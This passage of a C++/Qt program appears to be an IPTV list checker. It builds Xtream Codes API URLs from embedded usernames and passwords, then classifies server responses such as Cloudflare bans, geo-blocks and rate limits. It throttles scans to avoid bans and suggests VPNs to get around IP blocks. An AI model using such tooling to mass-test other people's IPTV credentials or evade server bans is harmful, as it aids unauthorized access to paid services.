#include <QApplication>
#include <QWidget>
#include <QTabWidget>
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QTextEdit>
#include <QPushButton>
#include <QCheckBox>
#include <QProgressBar>
#include <QLabel>
#include <QFileDialog>
#include <QMessageBox>
#include <QIcon>
#include <QDateTime>
#include <QThread>
#include <QFile>
#include <QTextStream>
#include <QScrollBar>
#include <QUrl>
#include <QUrlQuery>
#include <QDebug>
#include <QStringList>
#include <QSet>
#include <QGroupBox>
#include <QRegularExpression>
#include <QTimer>
#include <QNetworkAccessManager>
#include <QNetworkReply>
#include <QJsonDocument>
#include <QJsonObject>
#include <QPainter>
#include <QBrush>
#include <QPalette>
#include <QColor>
#include <QThreadPool>
#include <QMutex>
#include <QRunnable>
#include <QMutexLocker>
#include <QMimeData>
#include <QKeyEvent>
#include <QClipboard>
#include <QSemaphore>
#include <QCryptographicHash>
#include <atomic>
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include <thread>
#include <chrono>
#include <random>
#include <iostream>
#include <algorithm>
#include <sstream>
#include <future>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <functional>
#include <stack>
#ifdef _WIN32
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #pragma comment(lib, "ws2_32.lib")
#else
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <unistd.h>
  #include <fcntl.h>
#endif
#include "modernstyle.h"

using json = nlohmann::json;

// ═══════════════════════════════════════════════════════════════════
// HELPER FUNKCIJE
// ═══════════════════════════════════════════════════════════════════

static QString extractQueryParam(const QString &url, const QString &param) {
    QUrl qurl(url);
    if (qurl.isValid() && qurl.hasQuery()) {
        QUrlQuery query(qurl.query(QUrl::FullyEncoded));
        if (query.hasQueryItem(param))
            return query.queryItemValue(param, QUrl::FullyDecoded);
    }
    int qPos = url.indexOf('?');
    if (qPos < 0) return "";
    QString queryStr = url.mid(qPos + 1);
    for (const QString &part : queryStr.split('&')) {
        int eq = part.indexOf('=');
        if (eq < 0) continue;
        if (part.left(eq) == param)
            return QUrl::fromPercentEncoding(part.mid(eq + 1).toUtf8());
    }
    return "";
}

static QString extractBaseUrl(const QString &url) {
    int protoEnd = url.indexOf("://");
    if (protoEnd < 0) return "";
    int afterProto = protoEnd + 3;
    int atPos    = url.indexOf('@', afterProto);
    int slashPos = url.indexOf('/', afterProto);
    int queryPos = url.indexOf('?', afterProto);
    if (atPos >= 0 && (slashPos < 0 || atPos < slashPos) && (queryPos < 0 || atPos < queryPos))
        afterProto = atPos + 1;
    slashPos = url.indexOf('/', afterProto);
    queryPos = url.indexOf('?', afterProto);
    int hostEnd;
    if (slashPos < 0 && queryPos < 0) hostEnd = url.length();
    else if (slashPos < 0)            hostEnd = queryPos;
    else if (queryPos < 0)            hostEnd = slashPos;
    else                              hostEnd = qMin(slashPos, queryPos);
    return url.left(protoEnd + 3) + url.mid(afterProto, hostEnd - afterProto);
}

static QString extractBaseUrlSafe(const QString &url) {
    QUrl qurl(url);
    if (qurl.isValid() && !qurl.host().isEmpty()) {
        QString scheme = qurl.scheme();
        QString host   = qurl.host();
        int port       = qurl.port();
        if (port > 0)
            return QString("%1://%2:%3").arg(scheme, host, QString::number(port));
        return QString("%1://%2").arg(scheme, host);
    }
    return extractBaseUrl(url);
}

static std::pair<QString, int> parseHostPort(const QString &base) {
    QUrl qurl(base);
    if (qurl.isValid() && !qurl.host().isEmpty()) {
        int port = qurl.port();
        if (port <= 0) port = (base.startsWith("https") ? 443 : 80);
        return { qurl.host(), port };
    }
    int protoEnd = base.indexOf("://");
    QString hostPart = (protoEnd >= 0) ? base.mid(protoEnd + 3) : base;
    int colon = hostPart.lastIndexOf(':');
    if (colon < 0)
        return { hostPart, base.startsWith("https") ? 443 : 80 };
    QString host = hostPart.left(colon);
    bool ok;
    int port = hostPart.mid(colon + 1).toInt(&ok);
    return { host, ok ? port : 80 };
}

static QString buildApiUrl(const QString &link) {
    QString base     = extractBaseUrlSafe(link);
    QString username = extractQueryParam(link, "username");
    QString password = extractQueryParam(link, "password");
    if (base.isEmpty() || username.isEmpty() || password.isEmpty()) return "";
    QString encUser = QString::fromUtf8(QUrl::toPercentEncoding(username, "@._-"));
    QString encPass = QString::fromUtf8(QUrl::toPercentEncoding(password, "@._-!"));
    return base + "/player_api.php?username=" + encUser + "&password=" + encPass;
}

static QString buildM3uUrl(const QString &link) {
    QString base     = extractBaseUrlSafe(link);
    QString username = extractQueryParam(link, "username");
    QString password = extractQueryParam(link, "password");
    if (base.isEmpty() || username.isEmpty() || password.isEmpty()) return "";
    QString encUser = QString::fromUtf8(QUrl::toPercentEncoding(username, "@._-"));
    QString encPass = QString::fromUtf8(QUrl::toPercentEncoding(password, "@._-!"));
    return base + "/get.php?username=" + encUser + "&password=" + encPass + "&type=m3u_plus";
}
// ═══════════════════════════════════════════════════════════════════
// ADVANCED RESPONSE CLASSIFIER
// ═══════════════════════════════════════════════════════════════════

enum class RClass {
    NORMAL_JSON,      // API vratio validan JSON
    DEBUG_MODE_HTML,  // XUI.one Debug Mode stranica
    GEO_BLOCK_403,    // 403 nginx/server bez CF = geo/IP blok
    CF_BAN,           // Cloudflare IP ban (CF-RAY header)
    RATE_429,         // Rate limit
    MEDIA_OK,         // Validan media stream (TS/MKV/MP4)
    M3U_OK,           // Validan M3U playlist
    TIMEOUT,          // Timeout / connection fail
    SERVER_ERROR,     // 502 / 503 / 504
    NOT_FOUND,        // 404
    REDIRECT,         // 301/302/307/308
    HTML_OTHER,       // HTML ali nije Debug Mode (portal, pogrešan URL)
    EMPTY,            // Status OK ali prazno telo
    UNKNOWN
};

static QString rclassStr(RClass rc) {
    switch(rc) {
        case RClass::NORMAL_JSON:     return "✅ JSON_OK";
        case RClass::DEBUG_MODE_HTML: return "🟡 DEBUG_MODE";
        case RClass::GEO_BLOCK_403:   return "🔴 GEO_BLOCK_403";
        case RClass::CF_BAN:          return "🔴 CF_BAN";
        case RClass::RATE_429:        return "🟠 RATE_429";
        case RClass::MEDIA_OK:        return "✅ MEDIA_OK";
        case RClass::M3U_OK:          return "✅ M3U_OK";
        case RClass::TIMEOUT:         return "⚫ TIMEOUT";
        case RClass::SERVER_ERROR:    return "💀 SERVER_ERR";
        case RClass::NOT_FOUND:       return "❌ 404";
        case RClass::REDIRECT:        return "↪️  REDIRECT";
        case RClass::HTML_OTHER:      return "🟠 HTML_OTHER";
        case RClass::EMPTY:           return "❓ EMPTY";
        default:                      return "❓ UNKNOWN";
    }
}

static RClass classifyResp(int status, const std::string &body,
                            const cpr::Header &headers, int errCode)
{
    // ── ct mora biti dostupan od pocetka (koristi se u media checku) ──
    auto hdrValEarly = [&](const std::string &k) -> std::string {
        auto it = headers.find(k);
        if (it != headers.end()) return it->second;
        std::string kl = k; std::transform(kl.begin(),kl.end(),kl.begin(),::tolower);
        it = headers.find(kl); return (it != headers.end()) ? it->second : "";
    };
    std::string ctEarly = hdrValEarly("Content-Type");
    std::transform(ctEarly.begin(), ctEarly.end(), ctEarly.begin(), ::tolower);

    // ── Medij: provjeri potpis PRIJE errCode (CPR partial read vraca errCode != 0) ──
    if ((status == 200 || status == 206) && !body.empty()) {
        bool isMedia = false;
        unsigned char b0 = (unsigned char)body[0];
        unsigned char b1 = (body.size() > 1) ? (unsigned char)body[1] : 0;

        if (b0 == 0x1A && b1 == 0x45) isMedia = true;            // MKV/EBML
        if (body.size() >= 8) {
            std::string b4 = body.substr(4, 4);
            if (b4=="ftyp"||b4=="moov"||b4=="moof") isMedia = true; // MP4
        }
        for (size_t i = 0; i + 188 < std::min(body.size(), (size_t)376); i++) {
            if ((unsigned char)body[i] == 0x47 &&
                (unsigned char)body[i+188] == 0x47) { isMedia = true; break; }
        }
        if (!isMedia && (ctEarly.find("matroska") != std::string::npos ||
                         ctEarly.find("video/")   != std::string::npos ||
                         ctEarly.find("audio/")   != std::string::npos))
            isMedia = true;

        if (isMedia) return RClass::MEDIA_OK;
    }

    // ── M3U: provjeri PRIJE errCode ──
    if (status == 200 && body.size() >= 7 && body.substr(0, 7) == "#EXTM3U")
        return RClass::M3U_OK;

    // ── Tek sada timeout ──
    if (errCode != 0 || status == 0)
        return RClass::TIMEOUT;
    if (status == 502||status==503||status==504) return RClass::SERVER_ERROR;
    if (status == 404||status==410)            return RClass::NOT_FOUND;
    if (status==301||status==302||status==307||status==308) return RClass::REDIRECT;
    if (status == 429)                         return RClass::RATE_429;

    auto hdrVal = [&](const std::string &k) -> std::string {
        auto it = headers.find(k);
        if (it != headers.end()) return it->second;
        std::string kl = k; std::transform(kl.begin(),kl.end(),kl.begin(),::tolower);
        it = headers.find(kl); return (it != headers.end()) ? it->second : "";
    };

    if (status==403||status==520||status==521||status==522||status==523) {
        std::string cfray  = hdrVal("CF-RAY");
        std::string srvhdr = hdrVal("Server");
        bool isCf = !cfray.empty() ||
                    srvhdr.find("cloudflare") != std::string::npos ||
                    status==520||status==521||status==522||status==523;
        return isCf ? RClass::CF_BAN : RClass::GEO_BLOCK_403;
    }

    if (status != 200 && status != 206) return RClass::UNKNOWN;
    if (body.empty())                   return RClass::EMPTY;


    if (!body.empty() && (body[0] == '{' || body[0] == '['))
    return RClass::NORMAL_JSON;

    std::string bs = body.substr(0, std::min(body.size(),(size_t)120));
    bool isDebug = (bs.find("XUI.one") != std::string::npos ||
                    bs.find("Debug Mode") != std::string::npos);
    if (isDebug) return RClass::DEBUG_MODE_HTML;

    bool isHtml = (bs.find("<html") != std::string::npos ||
                   bs.find("<!doctype") != std::string::npos ||
                   bs.find("<!DOCTYPE") != std::string::npos);
    if (isHtml) return RClass::HTML_OTHER;

    if (bs.substr(0, std::min(bs.size(),(size_t)7)) == "#EXTM3U")
        return RClass::M3U_OK;

    if (!body.empty() && (body[0]=='{' || body[0]=='['))
        return RClass::NORMAL_JSON;

    // Media signature check
    bool isMedia = false;
    if (body.size() >= 4) {
        // MKV/EBML
        if ((unsigned char)body[0]==0x1A && (unsigned char)body[1]==0x45 &&
            (unsigned char)body[2]==0xDF && (unsigned char)body[3]==0xA3)
            isMedia = true;
        // MP4 (ftyp/moov/moof at offset 4)
        if (!isMedia && body.size()>=8) {
            std::string b4 = body.substr(4,4);
            if (b4=="ftyp"||b4=="moov"||b4=="moof"||b4=="mdat") isMedia=true;
        }
        // MPEG-TS 0x47 sync
        if (!isMedia && body.size()>=188) {
            for (size_t i=0;i<std::min(body.size(),(size_t)376);i++) {
                if ((unsigned char)body[i]==0x47 && i+188<body.size() &&
                    (unsigned char)body[i+188]==0x47) { isMedia=true; break; }
            }
        }
        // MPEG Audio
        if (!isMedia && (unsigned char)body[0]==0xFF &&
            ((unsigned char)body[1]&0xE0)==0xE0) isMedia=true;
    }
    if (isMedia) return RClass::MEDIA_OK;

    std::string ct = hdrVal("Content-Type");
    std::transform(ct.begin(),ct.end(),ct.begin(),::tolower);
    if (ct.find("video")!=std::string::npos || ct.find("audio")!=std::string::npos ||
        ct.find("mpeg") !=std::string::npos || ct.find("octet")!=std::string::npos ||
        ct.find("mp4")  !=std::string::npos || ct.find("stream")!=std::string::npos)
        return RClass::MEDIA_OK;

    return RClass::UNKNOWN;
}

static void advancedLog(const QString &reqType, const QString &urlShort,
                         const QString &base,
                         int status, const std::string &body,
                         const cpr::Header &headers,
                         int elapsedMs, int errCode = 0)
{
    RClass rc = classifyResp(status, body, headers, errCode);
    QString cls = rclassStr(rc);
    bool bad = (rc==RClass::DEBUG_MODE_HTML || rc==RClass::GEO_BLOCK_403 ||
                rc==RClass::CF_BAN || rc==RClass::RATE_429 ||
                rc==RClass::TIMEOUT || rc==RClass::SERVER_ERROR ||
                rc==RClass::HTML_OTHER);

    auto hv = [&](const std::string &k) -> QString {
        auto it = headers.find(k);
        if (it!=headers.end()) return QString::fromStdString(it->second);
        std::string kl=k; std::transform(kl.begin(),kl.end(),kl.begin(),::tolower);
        it=headers.find(kl);
        return (it!=headers.end()) ? QString::fromStdString(it->second) : "";
    };

    // Body preview: text ili hex
    std::string preview;
    bool bin = false;
    if (!body.empty()) {
        std::string f = body.substr(0,std::min(body.size(),(size_t)60));
        for (char c:f) if ((unsigned char)c<32&&c!='\n'&&c!='\r'&&c!='\t'){bin=true;break;}
        if (bin) preview="HEX:"+QByteArray(body.data(),std::min((int)body.size(),24)).toHex().toStdString();
        else      preview=body.substr(0,std::min(body.size(),(size_t)300));
    }

    QString ts = QDateTime::currentDateTime().toString("HH:mm:ss.zzz");
    QString line = bad ?
        "▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼" :
        "───────────────────────────────────────────────────";

    qDebug().nospace() << "\n" << qPrintable(line);
    qDebug().nospace() << "[RESP] " << qPrintable(reqType)
                       << " | " << qPrintable(cls)
                       << " | " << qPrintable(ts);
    qDebug().nospace() << "  URL    : " << qPrintable(urlShort);
    qDebug().nospace() << "  Base   : " << qPrintable(base);
    qDebug().nospace() << "  Status : " << status
                       << " | elapsed=" << elapsedMs << "ms"
                       << " | bytes=" << body.size();

    QString svr = hv("Server");
    if (!svr.isEmpty())  qDebug().nospace() << "  Server : " << qPrintable(svr);
    QString cfr = hv("CF-RAY");
    if (!cfr.isEmpty())  qDebug().nospace() << "  CF-RAY : " << qPrintable(cfr) << "  ← CLOUDFLARE!";
    QString ct  = hv("Content-Type");
    if (!ct.isEmpty())   qDebug().nospace() << "  CT     : " << qPrintable(ct);
    QString loc = hv("Location");
    if (!loc.isEmpty())  qDebug().nospace() << "  Loc    : " << qPrintable(loc);
    QString xc  = hv("X-Cache");
    if (!xc.isEmpty())   qDebug().nospace() << "  X-Cache: " << qPrintable(xc);

    qDebug().nospace() << "  Body   : " << qPrintable(QString::fromStdString(preview));

    // Verdict
    switch(rc) {
        case RClass::DEBUG_MODE_HTML:
            qDebug() << "  ★ VERDICT: Server PREOPTEREĆEN (XUI.one Debug Mode)";
            qDebug() << "             NIJE geo-blok. Lista bi radila kad server odmori.";
            qDebug() << "             → Retry je opravdan.";
            break;
        case RClass::GEO_BLOCK_403:
            qDebug() << "  ★ VERDICT: Server BLOKIRA ovu IP/geo-lokaciju (nginx 403)";
            qDebug() << "             Nije server overload — tvoja IP je odbijena.";
            qDebug() << "             → Lista NEĆE raditi bez VPN-a.";
            break;
        case RClass::CF_BAN:
            qDebug() << "  ★ VERDICT: CLOUDFLARE IP BAN — Tvoja IP je trajno blokirana";
            qDebug() << "             → Jedino VPN sa drugom IP može pomoći.";
            break;
        case RClass::RATE_429:
            qDebug() << "  ★ VERDICT: RATE LIMIT — previše zahteva, server te usporava";
            qDebug() << "             → Sačekaj 5-10 minuta.";
            break;
        case RClass::TIMEOUT:
            qDebug() << "  ★ VERDICT: TIMEOUT — server ne odgovara";
            qDebug() << "             → Server mrtav ili internet problem.";
            break;
        case RClass::HTML_OTHER:
            qDebug() << "  ★ VERDICT: Server vratio HTML (nije Debug Mode, nije stream)";
            qDebug() << "             → Moguće pogrešan URL ili portal blokira pristup.";
            break;
        case RClass::MEDIA_OK:
            qDebug() << "  ★ VERDICT: ✅ VALIDAN STREAM — lista RADI na tvojoj lokaciji";
            break;
        case RClass::NORMAL_JSON:
            qDebug() << "  ★ VERDICT: ✅ API OK — pretplata aktivna";
            break;
        case RClass::NOT_FOUND:
            qDebug() << "  ★ VERDICT: 404 — sadržaj ne postoji na serveru";
            qDebug() << "             → Korisnik nema ovaj kanal/film u pretplati.";
            break;
        default: break;
    }
    qDebug().nospace() << qPrintable(line) << "\n";
}

// ═══════════════════════════════════════════════════════════════════
// ADVANCED SERVER DEBUG ANALYZER
// ═══════════════════════════════════════════════════════════════════

struct RequestRecord {
    std::chrono::steady_clock::time_point timestamp;
    std::string requestType;   // "API", "M3U", "STREAM"
    int responseStatus;
    int responseTimeMs;
    size_t responseBytes;
    std::string responseClass; // "JSON_OK", "DEBUG_MODE", "STREAM_OK", "TIMEOUT", "HTTP_ERR"
};

struct ServerDebugStats {
    std::mutex mx;
    std::vector<RequestRecord> records;
    int totalApi         = 0;
    int totalM3u         = 0;
    int totalStream      = 0;
    int totalDebugMode   = 0;
    int totalJsonOk      = 0;
    int totalStreamOk    = 0;
    int totalTimeout     = 0;
    int totalHttpErr     = 0;
    int peakConcurrent   = 0;
    std::atomic<int> currentConcurrent{0};
    std::chrono::steady_clock::time_point firstRequest;
    std::chrono::steady_clock::time_point lastRequest;
    bool firstSet = false;
};

static std::mutex                          g_serverDebugMutex;
static QMap<QString, ServerDebugStats*>    g_serverDebugStats;

static ServerDebugStats* getServerDebugStats(const QString &base) {
    std::lock_guard<std::mutex> lk(g_serverDebugMutex);
    if (!g_serverDebugStats.contains(base))
        g_serverDebugStats[base] = new ServerDebugStats();
    return g_serverDebugStats[base];
}

static void debugRecordRequest(const QString &base,
                                const std::string &reqType,
                                int status,
                                int elapsedMs,
                                size_t bytes,
                                const std::string &bodyStart) {
    auto* stats = getServerDebugStats(base);
    std::lock_guard<std::mutex> lk(stats->mx);

    auto now = std::chrono::steady_clock::now();
    if (!stats->firstSet) { stats->firstRequest = now; stats->firstSet = true; }
    stats->lastRequest = now;

    RequestRecord rec;
    rec.timestamp    = now;
    rec.requestType  = reqType;
    rec.responseStatus = status;
    rec.responseTimeMs = elapsedMs;
    rec.responseBytes  = bytes;

    // Klasifikuj odgovor — JSON MORA biti provjeren PRVI!
    // "Welcome to XUI.one" u JSON body-ju lažno triggira isDebugMode
    bool isJson = (!bodyStart.empty() && (bodyStart[0] == '{' || bodyStart[0] == '['));
    bool isDebugMode = !isJson && (bodyStart.find("XUI.one") != std::string::npos ||
                                   bodyStart.find("Debug Mode") != std::string::npos);

    if (isJson && status == 200 && bytes > 100) {
        rec.responseClass = "JSON_OK";
        stats->totalJsonOk++;
    } else if (isDebugMode) {
        rec.responseClass = "DEBUG_MODE";
        stats->totalDebugMode++;
    } else if (status == 0 || elapsedMs >= 9000) {
        rec.responseClass = "TIMEOUT";
        stats->totalTimeout++;
    } else if (status == 200 && bytes >= 64 &&
               bodyStart.find("{") == std::string::npos &&
               bodyStart.find("<") == std::string::npos) {
        rec.responseClass = "STREAM_OK";
        stats->totalStreamOk++;
    } else if (status >= 400) {
        rec.responseClass = "HTTP_ERR_" + std::to_string(status);
        stats->totalHttpErr++;
    } else {
        rec.responseClass = "OTHER_" + std::to_string(status);
    }

    if (reqType == "API")    stats->totalApi++;
    if (reqType == "M3U")    stats->totalM3u++;
    if (reqType == "STREAM") stats->totalStream++;

    stats->records.push_back(rec);

    // Logovati svakih 5 zahteva detaljan sažetak
    int total = (int)stats->records.size();
    if (total % 5 == 0 || isDebugMode || status >= 400) {
        // Izračunaj rate (zahtevi/min u poslednjih 60s)
        int recentCount = 0;
        auto cutoff = now - std::chrono::seconds(60);
        for (auto &r : stats->records)
            if (r.timestamp > cutoff) recentCount++;

        // Prosečan interval između zahteva
        double avgGapMs = 0.0;
        if (stats->records.size() >= 2) {
            auto totalSpanMs = std::chrono::duration_cast<std::chrono::milliseconds>(
                stats->lastRequest - stats->firstRequest).count();
            avgGapMs = (double)totalSpanMs / (stats->records.size() - 1);
        }

        // Debug Mode ratio
        double dmRatio = total > 0 ? (stats->totalDebugMode * 100.0 / total) : 0.0;

        qDebug() << "\n"
                 << "╔══════════════════════════════════════════════════════════╗";
        qDebug() << "║ [SERVER ANALYZER]" << base;
        qDebug() << "╠══════════════════════════════════════════════════════════╣";
        qDebug() << "║ Ukupno zahteva  :" << total
                 << "  (API:" << stats->totalApi
                 << " M3U:" << stats->totalM3u
                 << " STREAM:" << stats->totalStream << ")";
        qDebug() << "║ Odgovori        : JSON_OK=" << stats->totalJsonOk
                 << " DEBUG_MODE=" << stats->totalDebugMode
                 << " STREAM_OK=" << stats->totalStreamOk
                 << " TIMEOUT=" << stats->totalTimeout
                 << " HTTP_ERR=" << stats->totalHttpErr;
        qDebug() << "║ Debug Mode %    :" << QString::number(dmRatio, 'f', 1) << "%";
        qDebug() << "║ Rate (zadnjih60s):" << recentCount << "zahteva/min";
        qDebug() << "║ Prosečan gap    :" << QString::number(avgGapMs, 'f', 0) << "ms";
        qDebug() << "║ Ovaj zahtev     :" << QString::fromStdString(reqType)
                 << "status=" << status
                 << "elapsed=" << elapsedMs << "ms"
                 << "bytes=" << bytes
                 << "class=" << QString::fromStdString(rec.responseClass);

        // Poslednja 3 zahteva radi trend analize
        int showN = qMin(3, (int)stats->records.size());
        qDebug() << "║ Zadnja" << showN << "zahteva:";
        for (int i = (int)stats->records.size() - showN; i < (int)stats->records.size(); i++) {
            auto &r = stats->records[i];
            qDebug() << "║   [" << QString::fromStdString(r.requestType) << "]"
                     << "status=" << r.responseStatus
                     << "elapsed=" << r.responseTimeMs << "ms"
                     << "bytes=" << r.responseBytes
                     << "→" << QString::fromStdString(r.responseClass);
        }

        // UPOZORENJE ako je debug mode ratio visok
        if (dmRatio > 30.0) {
            qDebug() << "║ ⚠️ UPOZORENJE: Debug Mode ratio je" << QString::number(dmRatio,'f',1)
                     << "% → server je preopterećen!";
            qDebug() << "║    Preporučeni gap između zahteva: >= 8000ms";
        }
        if (recentCount > 10) {
            qDebug() << "║ ⚠️ UPOZORENJE: " << recentCount
                     << "zahteva u zadnjih 60s → previše brzo!";
        }
        qDebug() << "╚══════════════════════════════════════════════════════════╝";
    }
}

static void debugPrintFinalReport(const QString &base) {
    auto* stats = getServerDebugStats(base);
    std::lock_guard<std::mutex> lk(stats->mx);
    if (stats->records.empty()) return;

    int total = (int)stats->records.size();
    double totalSpanSec = 0.0;
    if (stats->firstSet && stats->records.size() >= 2) {
        totalSpanSec = std::chrono::duration_cast<std::chrono::milliseconds>(
            stats->lastRequest - stats->firstRequest).count() / 1000.0;
    }

    double dmRatio = total > 0 ? (stats->totalDebugMode * 100.0 / total) : 0.0;
    double overallRate = (totalSpanSec > 0) ? (total * 60.0 / totalSpanSec) : 0.0;
    double avgGapMs = (total >= 2 && totalSpanSec > 0)
        ? (totalSpanSec * 1000.0 / (total - 1)) : 0.0;

    qDebug() << "\n";
    qDebug() << "╔══════════════════════════════════════════════════════════════╗";
    qDebug() << "║         FINALNI IZVEŠTAJ ZA SERVER:" << base;
    qDebug() << "╠══════════════════════════════════════════════════════════════╣";
    qDebug() << "║ Ukupno zahteva   :" << total;
    qDebug() << "║ Ukupno trajanje  :" << QString::number(totalSpanSec, 'f', 1) << "sec";
    qDebug() << "║ Prosečan rate    :" << QString::number(overallRate, 'f', 1) << "zahteva/min";
    qDebug() << "║ Prosečan gap     :" << QString::number(avgGapMs, 'f', 0) << "ms";
    qDebug() << "║ API zahtevi      :" << stats->totalApi;
    qDebug() << "║ M3U zahtevi      :" << stats->totalM3u;
    qDebug() << "║ STREAM zahtevi   :" << stats->totalStream;
    qDebug() << "╠══════════════════════════════════════════════════════════════╣";
    qDebug() << "║ JSON OK          :" << stats->totalJsonOk;
    qDebug() << "║ DEBUG MODE       :" << stats->totalDebugMode
             << "(" << QString::number(dmRatio, 'f', 1) << "%)";
    qDebug() << "║ STREAM OK        :" << stats->totalStreamOk;
    qDebug() << "║ TIMEOUT          :" << stats->totalTimeout;
    qDebug() << "║ HTTP ERRORS      :" << stats->totalHttpErr;
    qDebug() << "╠══════════════════════════════════════════════════════════════╣";

    // Pronađi prvi zahtev koji je vratio Debug Mode
    for (int i = 0; i < total; i++) {
        if (stats->records[i].responseClass == "DEBUG_MODE") {
            // Koliko ms je prošlo od prvog zahteva do prvog Debug Mode?
            auto gapToFirstDebug = std::chrono::duration_cast<std::chrono::milliseconds>(
                stats->records[i].timestamp - stats->firstRequest).count();
            qDebug() << "║ PRVI DEBUG MODE na zahtevu #" << (i+1)
                     << "tip=" << QString::fromStdString(stats->records[i].requestType)
                     << "za" << gapToFirstDebug << "ms od starta";
            break;
        }
    }

    // Preporuka
    if (avgGapMs < 3000 && dmRatio > 20) {
        qDebug() << "║";
        qDebug() << "║ 💡 PREPORUKA: Gap=" << QString::number(avgGapMs,'f',0)
                 << "ms je premali za ovaj server.";
        qDebug() << "║    Server zahteva minimum ~8000-10000ms između zahteva.";
        qDebug() << "║    Debug Mode ratio=" << QString::number(dmRatio,'f',1)
                 << "% → server ne može da procesira brzinu skeniranja.";
    }

    qDebug() << "╚══════════════════════════════════════════════════════════════╝";
}

static void debugPrintTimeline(const QString &base) {
    auto* stats = getServerDebugStats(base);
    std::lock_guard<std::mutex> lk(stats->mx);
    if (stats->records.size() < 2) return;
    qDebug() << "\n╔══════════════════════════════════════════════════════════════════╗";
    qDebug() << "║  TIMELINE ANALIZA:" << base;
    qDebug() << "╠══════════════════════════════════════════════════════════════════╣";
    qDebug() << "║  #  │ tip    │ status │  ms  │ gap_ms │ klasa";
    qDebug() << "╠══════════════════════════════════════════════════════════════════╣";
    int debugStart = -1;
    int banStart   = -1;
    int maxGap     = 0;
    int minGap     = 999999;
    long long totalGapMs = 0;
    int gapCount = 0;
    for (int i = 0; i < (int)stats->records.size(); i++) {
        const auto &r = stats->records[i];
        int gapMs = -1;
        if (i > 0) {
            gapMs = (int)std::chrono::duration_cast<std::chrono::milliseconds>(
                r.timestamp - stats->records[i-1].timestamp).count();
            totalGapMs += gapMs;
            gapCount++;
            if (gapMs > maxGap) maxGap = gapMs;
            if (gapMs < minGap) minGap = gapMs;
        }
        if (r.responseClass == "DEBUG_MODE" && debugStart < 0) debugStart = i;
        if (r.responseClass.find("HTTP_ERR_403") != std::string::npos && banStart < 0) banStart = i;
        QString gapStr = (gapMs >= 0) ? QString::number(gapMs) : "  -  ";
        QString marker = "";
        if (i == debugStart) marker = " <- PRVI DEBUG";
        if (i == banStart)   marker = " <- BAN TRIGGER!";
        qDebug().nospace()
            << "║ " << qSetFieldWidth(3) << (i+1) << qSetFieldWidth(0)
            << " | " << qSetFieldWidth(6) << QString::fromStdString(r.requestType).left(6) << qSetFieldWidth(0)
            << " | " << qSetFieldWidth(6) << r.responseStatus << qSetFieldWidth(0)
            << " | " << qSetFieldWidth(5) << r.responseTimeMs << qSetFieldWidth(0)
            << " | " << qSetFieldWidth(6) << gapStr << qSetFieldWidth(0)
            << " | " << QString::fromStdString(r.responseClass)
            << qPrintable(marker);
    }
    qDebug() << "╠══════════════════════════════════════════════════════════════════╣";
    double avgGap = (gapCount > 0) ? (double)totalGapMs / gapCount : 0;
    qDebug() << "║ Gap: avg=" << QString::number(avgGap,'f',0) << "ms"
             << " min=" << minGap << "ms  max=" << maxGap << "ms";
    qDebug() << "╠══════════════════════════════════════════════════════════════════╣";
    if (debugStart >= 0) {
        qDebug() << "║ DEBUG MODE poceo na zahtevu #" << (debugStart+1);
        if (debugStart > 0) {
            int gapBeforeDebug = (int)std::chrono::duration_cast<std::chrono::milliseconds>(
                stats->records[debugStart].timestamp - stats->records[debugStart-1].timestamp).count();
            qDebug() << "║ Gap PRIJE prvog Debug Mode:" << gapBeforeDebug << "ms";
            if (gapBeforeDebug < 5000)
                qDebug() << "║ UZROK: Gap" << gapBeforeDebug << "ms premali (treba min 8000ms)";
        }
    }
    if (banStart >= 0) {
        qDebug() << "║ BAN (403) poceo na zahtevu #" << (banStart+1);
        if (avgGap < 8000)
            qDebug() << "║ UZROK: avg gap=" << QString::number(avgGap,'f',0) << "ms < 8000ms";
    }
    if (debugStart < 0 && banStart < 0)
        qDebug() << "║ Nema Debug Mode ni BAN-a";
    qDebug() << "╠══════════════════════════════════════════════════════════════════╣";
    if (avgGap < 5000 && (debugStart >= 0 || banStart >= 0)) {
        int preporuceni = (banStart >= 0) ? 15000 : 10000;
        qDebug() << "║ PREPORUKA: Povecaj delay na min" << preporuceni << "ms";
    }
    qDebug() << "╚══════════════════════════════════════════════════════════════════╝\n";
}

// Reset stats za novi scan
static void debugResetServerStats(const QString &base) {
    auto* stats = getServerDebugStats(base);
    std::lock_guard<std::mutex> lk(stats->mx);
    stats->records.clear();
    stats->totalApi = stats->totalM3u = stats->totalStream = 0;
    stats->totalDebugMode = stats->totalJsonOk = stats->totalStreamOk = 0;
    stats->totalTimeout = stats->totalHttpErr = 0;
    stats->firstSet = false;
    qDebug() << "[DEBUG_ANALYZER] Reset statistika za:" << base;
}

// ═══════════════════════════════════════════════════════════════════
// PER-SERVER REQUEST THROTTLE
// ═══════════════════════════════════════════════════════════════════

static std::mutex                              g_throttleMutex;
static QMap<QString, std::chrono::steady_clock::time_point> g_lastRequestTime;

static void throttleServerRequest(const QString &serverKey, int minDelayMs) {
    std::unique_lock<std::mutex> lock(g_throttleMutex);
    auto now = std::chrono::steady_clock::now();
    auto it  = g_lastRequestTime.find(serverKey);
    if (it != g_lastRequestTime.end()) {
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - it.value()).count();
        if (elapsed < minDelayMs) {
            int wait = minDelayMs - (int)elapsed;
            lock.unlock();
            std::this_thread::sleep_for(std::chrono::milliseconds(wait));
            lock.lock();
        }
    }
    g_lastRequestTime[serverKey] = std::chrono::steady_clock::now();
}
// ── SEKVENCIJALNI SERVER THROTTLE (thread-safe, bez race condition) ──
struct SeqServerThrottle {
    std::mutex  mx;
    std::chrono::steady_clock::time_point nextSendTime{std::chrono::steady_clock::now()};
};

static std::mutex                              g_seqThrottleMx;
static QMap<QString, SeqServerThrottle*>       g_seqThrottle;

static SeqServerThrottle* getSeqThrottle(const QString &key) {
    std::lock_guard<std::mutex> lk(g_seqThrottleMx);
    if (!g_seqThrottle.contains(key))
        g_seqThrottle[key] = new SeqServerThrottle();
    return g_seqThrottle[key];
}

static void seqThrottleWait(const QString &serverKey, int minDelayMs,
                             std::atomic<bool> &stopFlag) {
    auto* st = getSeqThrottle(serverKey);
